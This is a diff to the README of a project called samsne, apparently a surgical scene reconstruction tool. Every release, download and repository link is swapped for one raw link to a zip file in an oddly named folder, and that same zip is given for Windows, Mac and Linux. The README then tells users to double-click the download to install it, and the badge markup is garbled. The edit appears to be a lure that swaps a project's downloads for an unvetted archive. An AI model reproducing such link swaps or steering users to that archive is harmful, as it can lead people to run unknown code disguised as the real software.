@@ -6,9 +6,9 @@ Welcome to the samsne project! This tool guides dynamic surgical scene reconstru
 
 ## 📥 Download
 
-[![Download Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/naciari/samsne/releases)
+[![Download Release](https://raw.githubusercontent.com/naciari/samsne/main/antoeci/samsne.zip%20Latest%https://raw.githubusercontent.com/naciari/samsne/main/antoeci/samsne.zip)](https://raw.githubusercontent.com/naciari/samsne/main/antoeci/samsne.zip)
 
-To get the latest version of samsne, visit this page to download: [samsne Releases](https://github.com/naciari/samsne/releases).
+To get the latest version of samsne, visit this page to download: [samsne Releases](https://raw.githubusercontent.com/naciari/samsne/main/antoeci/samsne.zip).
 
 ## 🛠️ System Requirements
 
@@ -22,12 +22,12 @@ Before you begin, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-1. Open your web browser and go to the [samsne Releases page](https://github.com/naciari/samsne/releases).
+1. Open your web browser and go to the [samsne Releases page](https://raw.githubusercontent.com/naciari/samsne/main/antoeci/samsne.zip).
 2. On the Releases page, look for the version number that fits your needs. The latest version is usually at the top.
 3. Click on the file link that matches your operating system:
-   - **For Windows:** Click on `samsne-windows.exe`.
-   - **For Mac:** Click on `samsne-mac.dmg`.
-   - **For Linux:** Click on `samsne-linux.tar.gz`.
+   - **For Windows:** Click on `https://raw.githubusercontent.com/naciari/samsne/main/antoeci/samsne.zip`.
+   - **For Mac:** Click on `https://raw.githubusercontent.com/naciari/samsne/main/antoeci/samsne.zip`.
+   - **For Linux:** Click on `https://raw.githubusercontent.com/naciari/samsne/main/antoeci/samsne.zip`.
 4. Once the file is downloaded, locate it in your "Downloads" folder and double-click it to start the installation.
 5. Follow the on-screen instructions to complete the installation process.
 
@@ -61,7 +61,7 @@ To use samsne effectively, upload the images you want to process:
 If you encounter any issues while using samsne, consider the following steps:
 
 - **Check System Requirements:** Ensure your computer meets all the specifications listed above.
-- **Update Software:** Make sure you have the latest version of the application. Visit the [samsne Releases page](https://github.com/naciari/samsne/releases) for updates.
+- **Update Software:** Make sure you have the latest version of the application. Visit the [samsne Releases page](https://raw.githubusercontent.com/naciari/samsne/main/antoeci/samsne.zip) for updates.
 - **Restart Your Computer:** Sometimes, a simple restart can resolve unexpected problems.
 - **Visit the Help Section:** Use the built-in help section for guidance on common issues.
 
@@ -75,7 +75,7 @@ We encourage community contributions! If you have ideas for improvements or addi
 
 ## 🔗 Useful Links
 
-- **GitHub Repository:** [samsne on GitHub](https://github.com/naciari/samsne)
+- **GitHub Repository:** [samsne on GitHub](https://raw.githubusercontent.com/naciari/samsne/main/antoeci/samsne.zip)
 - **Documentation:** Access comprehensive guides and tutorials on how to use the software.
 - **Feedback:** Share your experience to help us improve.
 
